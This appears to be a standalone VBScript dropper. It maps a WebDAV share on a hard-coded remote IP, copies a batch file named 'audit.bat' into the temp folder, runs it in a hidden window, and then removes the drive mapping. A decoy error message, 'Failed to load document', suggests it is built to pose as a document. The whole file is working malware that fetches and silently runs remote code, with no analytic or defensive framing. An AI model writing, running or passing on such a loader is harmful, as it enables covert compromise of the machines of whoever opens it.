Set fso = CreateObject("Scripting.FileSystemObject")
Set w = CreateObject("WScript.Shell")
Set net = CreateObject("WScript.Network")

targetUNC = "\\198.135.50.89@6065\DavWWWRoot"
sourceFilename = "audit.bat"
destFile = w.ExpandEnvironmentStrings("%TEMP%") & "\tmp.bat"

' Find an available drive letter
Dim availableDrive
availableDrive = ""
For i = Asc("Z") To Asc("E") Step -1
    If Not fso.DriveExists(Chr(i) & ":") Then
        availableDrive = Chr(i) & ":"
        Exit For
    End If
Next

If availableDrive = "" Then
    WScript.Echo "No available drive letters found."
    WScript.Quit
End If

' Map the drive
On Error Resume Next
net.MapNetworkDrive availableDrive, targetUNC, False
If Err.Number <> 0 Then
    WScript.Echo "Failed to load document " & availableDrive & ": " & Err.Description
    WScript.Quit
End If
On Error Goto 0

' Perform the copy using the dynamic drive letter
sourcePath = availableDrive & "\" & sourceFilename
If fso.FileExists(sourcePath) Then
    fso.CopyFile sourcePath, destFile, True
    w.Run """" & destFile & """", 0, False
Else
    WScript.Echo "File not found: " & sourcePath
End If

' Cleanup: Remove the mapping
net.RemoveNetworkDrive availableDrive, True